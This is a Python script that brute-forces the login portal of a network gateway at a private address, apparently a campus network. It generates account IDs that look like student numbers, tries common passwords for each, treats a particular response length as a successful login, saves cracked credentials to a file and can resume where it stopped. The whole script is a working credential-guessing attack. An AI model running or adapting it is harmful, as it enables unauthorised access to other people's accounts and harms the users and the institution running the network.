#!/usr/bin/env python3

import requests
import os
from time import sleep

requests.adapters.DEFAULT_RETRIES = 5  


SUCCESS = "\033[1;32m[+]\033[0m"
FAILED = "\033[1;31m[-]\033[0m"

class Brute:
	
	def __init__(self):
		self.login_url = "http://172.16.1.253" 	
		self.logout_url = "http://172.16.1.253/F.htm" 
	def My_Requests(self,method,*args,**kwargs):
		try:
			header = {
				"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1",
				"Connection":"close"
			}
			return requests.post(*args,**kwargs,headers = header) if method == "post" else requests.get(*args,**kwargs,headers=header)

		except Exception as e: 
			print(e)
			print("Something Wrong")
			exit()
			return False
			 
	def login(self,Account,Password):
		try:
			data = {
				"DDDDD":Account,
				"upass":Password,
				"0MKKey":"1"
			}
			#print(data)
			response = self.My_Requests("post",self.login_url,data = data)
			if response:
				if response.headers["Content-Length"] == "2501":
					return True
			else:
				return False
			sleep(2)
			#return True if self.My_Requests("post",s lf.login_url,data = data).headers["Content-Length"] == "2501" else False
		except KeyboardInterrupt:
			with open(os.path.basename(__file__)+".tmp","w") as f:
				f.write("{}".format(Account))
			print("Bruting Pause")
			exit()
	
	def logout(self):
		self.My_Requests("get",self.logout_url)

		
def continue_brute(func):
	def A():
		Current = 0
		Current_file = os.path.basename(__file__)
		if os.path.exists(Current_file+".tmp"):
			with open(Current_file+".tmp","r") as f:
				Current = f.readline().strip("\n")
		return func(Current)
	return A

	
@continue_brute
def main(Current):
	Account_list = []
	Password_list = ["123456","","123456789","12345678","Password","Pa$$w0rd"]
	for i in range(14,19):
		for j in range(0,8):
			for x in range(1,4):
				for y in range(1,31):
					Account_list.append("%d%02d%02d%02d"%(i,j,x,y))
	Account_list = Account_list[Account_list.index(Current):] if Current!=0 else Account_list[:]
	A = Brute()
	for Account in Account_list:
		for Password in Password_list:
			print("Trying {}:{}".format(Account,Password))
			if(A.login(Account,Password)):
				print("{} Login Success!----->{}:{}".format(SUCCESS,Account,Password))
				with open("Account_List","a+") as f:
					f.write("{} : {}\n".format(Account,Password))
				A.logout()
			else:
				print("{} Login Failed!".format(FAILED))

if __name__ == "__main__":
	main()
